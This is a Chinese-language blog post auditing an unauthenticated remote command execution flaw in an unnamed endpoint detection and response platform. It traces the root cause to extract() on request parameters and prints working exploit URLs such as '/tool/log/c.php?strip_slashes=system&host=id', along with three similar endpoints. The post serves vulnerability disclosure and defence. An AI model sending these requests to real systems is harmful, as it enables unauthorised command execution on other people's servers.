---
layout: post
author: Vulkey_Chen
title: "某终端检测响应平台代码审计分析"
date: 2020-09-03
music-id: 
permalink: /archives/2020-09-03/2
description: "某终端检测响应平台代码审计分析"
---

# 某终端检测响应平台代码审计分析

## 前言

2020年08月17日收到一条漏洞情报，某终端检测响应平台代码未授权RCE：`/tool/log/c.php?strip_slashes=system&host=id`

![-w1120](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-09-03/15977354683614.jpg)

参数：**host**，可以修改任意的系统命令进行执行。

## 原理分析

首先我们跟进一下**/tool/log/c.php**文件发现其没有任何权限限制，所以我们只需要看一下请求参数是如何传递的，搜索关键词：

```php
$_POST
$_GET
$_REQUEST
```

在代码第144行、146行分别调用了**变量匿名函数**，并将`$_REQUEST`作为传递参数：

```php
$show_form($_REQUEST);
...
$main($_REQUEST);
```

先跟进**$show_form**这个匿名函数：

```php
$show_form = function($params) use(&$strip_slashes, &$show_input) {
    extract($params);
    $host  = isset($host)  ? $strip_slashes($host)  : "127.0.0.1";
    $path  = isset($path)  ? $strip_slashes($path)  : "";
    $row   = isset($row)   ? $strip_slashes($row)   : "";
    $limit = isset($limit) ? $strip_slashes($limit) : 1000;
    
    // 绘制表单
    echo "<pre>";
    echo '<form id="studio" name="studio" method="post" action="">';
    $show_input(array("title" => "Host ",  "name" => "host",  "value" => $host,  "note" => " - host, e.g. 127.0.0.1"));
    $show_input(array("title" => "Path ",  "name" => "path",  "value" => $path,  "note" => " - path regex, e.g. mapreduce"));
    $show_input(array("title" => "Row  ",  "name" => "row",   "value" => $row,   "note" => " - row regex, e.g. \s[w|e]\s"));
    $show_input(array("title" => "Limit",  "name" => "limit", "value" => $limit, "note" => " - top n, e.g. 100"));
    echo '<input type="submit" id="button">';
    echo '</form>';
    echo "</pre>";
};
```

变量匿名函数 **$show_form** 具有一个形式参数 **$params** 在这里也就是`array("strip_slashes"=>"system","host"=>"id");`

接下来执行**extract($params);**，后进入如下代码：

```php
$host  = isset($host)  ? $strip_slashes($host)  : "127.0.0.1";
```

在这个过程中就产生了漏洞，想要了解具体原因，我们需要了解**extract**函数的作用，该函数是根据数组的`key=>value`创建变量`$key=value`（官方解释：**extract — Import variables into the current symbol table from an array**）

知道其函数作用之后，我们就大致明白漏洞原因了。

首先函数传入参数值为`array("strip_slashes"=>"system","host"=>"id");`

经过**extract()**函数后，赋值了2个变量：

```php
$strip_slashes = 'system';
$host = 'id';
```

在第91行代码，变量**$host**利用三元运算重新赋值**\$strip_slashes($host)**

而实际上其赋值内容是函数`system('id')`的返回结果，这也就造成了命令执行漏洞。

## 同类漏洞寻找

首先在全局文件中搜索`$_GET、$_POST、$_REQUEST`和`extract(`，其次在这些文件中使用正则寻找变量函数传递变量：`\$[a-zA-Z0-9_]*\(\$[a-zA-Z0-9_]*\)`

Linux grep寻找命令：

```shell
grep -E "\$_GET|\$_POST|\$_REQUEST" . -r --include \*.php -v | grep "extract(" -v | grep -E "\\\$[a-zA-Z0-9_]*\(\\\$[a-zA-Z0-9_]*\)"
```

简单分析获得了另外三处RCE：

```
/tool/php_cli.php?strip_slashes=system&code=id
/tool/ldb_cli.php?strip_slashes=system&json=id
/tool/mdd_sql.php?strip_slashes=system&root=id
```

但无法真正利用，三处文件开头都有一个类似文件存活的判断，不存在代码则**die**退出，而默认环境上是存在：

![-w568](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-09-03/15977415061102.jpg)


## 最后

该套程序还有诸多漏洞未被披露出来，建议采用ACL控制访问或下线该业务，等待官方升级补丁。